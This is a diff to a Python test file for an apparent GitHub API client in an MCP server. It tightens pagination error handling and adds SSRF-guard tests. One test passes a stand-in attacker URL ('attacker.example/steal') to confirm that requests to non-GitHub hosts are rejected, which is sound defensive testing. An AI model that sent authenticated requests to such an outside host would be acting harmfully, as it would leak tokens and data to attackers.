@@ -154,8 +154,8 @@ async def test_gh_request_paginated_non_list_response(httpx_mock, monkeypatch):
         url="https://api.github.com/repos/owner/repo?per_page=100",
         json={"id": 1},
     )
-    result = await gh_request_paginated("GET", "repos/owner/repo")
-    assert result == {"id": 1}
+    with pytest.raises(GhError, match="expected a list response"):
+        await gh_request_paginated("GET", "repos/owner/repo")
 
 
 def test_validate_repo():
@@ -168,3 +168,35 @@ def test_validate_ref():
     assert validate_ref("main") == "main"
     with pytest.raises(GhError):
         validate_ref("-invalid")
+
+
+@pytest.mark.asyncio
+async def test_gh_request_rejects_non_github_absolute_url(monkeypatch):
+    """SSRF guard: absolute URLs not pointing to api.github.com must be rejected."""
+    import mcp_servers.github.client
+
+    async def mock_token():
+        return "mock-token"
+
+    monkeypatch.setattr(mcp_servers.github.client, "get_installation_token", mock_token)
+
+    with pytest.raises(GhError, match="not allowed"):
+        await gh_request("GET", "https://attacker.example/steal")
+
+
+@pytest.mark.asyncio
+async def test_gh_request_allows_api_github_com_absolute_url(httpx_mock, monkeypatch):
+    """Absolute api.github.com URLs (e.g. GraphQL, paginated next links) must be allowed."""
+    import mcp_servers.github.client
+
+    async def mock_token():
+        return "mock-token"
+
+    monkeypatch.setattr(mcp_servers.github.client, "get_installation_token", mock_token)
+
+    httpx_mock.add_response(
+        url="https://api.github.com/repos/owner/repo",
+        json={"id": 1},
+    )
+    resp = await gh_request("GET", "https://api.github.com/repos/owner/repo")
+    assert resp.json()["id"] == 1
